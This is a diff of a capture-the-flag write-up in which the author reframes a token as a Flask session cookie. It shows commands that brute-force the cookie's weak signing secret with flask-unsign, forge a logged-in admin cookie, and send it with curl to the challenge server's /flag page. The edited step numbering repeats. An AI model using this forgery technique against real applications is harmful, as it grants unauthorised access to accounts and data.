@@ -150,14 +150,16 @@ We definitely get something back. But, this token doesn't seem up-to-spec with [
 
 ## Solution
 
-1. We know that we must authenticate via a JWT token.
-2. We know that the JWT token supplied is out-of-spec and can't be manipulated without the right tools. Let's install the right tools for the job.
+1. We know that we must authenticate via some sort of a JWT token cookie.
+2. We know that the JWT token supplied is out-of-spec and can't be manipulated without the right tools.
+3. After much research, this out-of-spec JWT token is actually a Flask session token.
+4. Since we don't know the secret used to sign the token, let's install the right tools for bruteforcing.
 
 ```sh
 pip3 install flask-unsign flask-unsign[wordlist]
 ```
 
-3. Decrypt the issued JWT token using bruteforce
+3. Decrypt the issued Flask session token using bruteforce
 
 ```sh
 $ flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOmZhbHNlfQ.ZYhMeg.gkzUDUfnJ_8YT7OXeqL-iKg1Q2I" --wordlist flask_unsign_wordlist/wordlists/all.txt
@@ -171,7 +173,7 @@ $ flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOmZhbHNlfQ.ZYhMeg.gkzUDUfnJ_8Y
 'password'
 ```
 
-4. Change the `logged_in` field to `True` and sign the new JWT token with the same key.
+4. Change the `logged_in` field to `True` and sign the new Flask session token with the same key.
 
 ```sh
 $ flask-unsign --sign --cookie "{'logged_in':True}" --secret password
@@ -181,7 +183,7 @@ $ flask-unsign --sign --cookie "{'logged_in':True}" --secret password
 eyJsb2dnZWRfaW4iOnRydWV9.ZYhT-Q.vysFmPznT24skoxe8B7ptQvd33M
 ```
 
-5. Use the manipulated JWT token in the request back to the server
+5. Use the manipulated Flask session token in the request back to the server
 
 ```sh
 $ curl -s --cookie "mihoyo_admin=eyJsb2dnZWRfaW4iOnRydWV9.ZYhT-Q.vysFmPznT24skoxe8B7ptQvd33M" https://genshin.nypinfosec.com/flag | html2text -
